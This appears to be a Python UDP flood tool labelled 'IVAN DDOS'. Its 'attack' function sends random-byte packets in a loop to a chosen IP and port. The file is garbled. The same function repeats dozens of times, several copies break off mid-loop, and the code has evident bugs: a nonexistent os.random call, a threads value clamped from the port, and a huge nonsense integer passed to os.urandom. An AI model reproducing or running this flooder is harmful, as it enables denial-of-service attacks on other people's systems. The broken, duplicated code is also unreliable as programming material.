    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
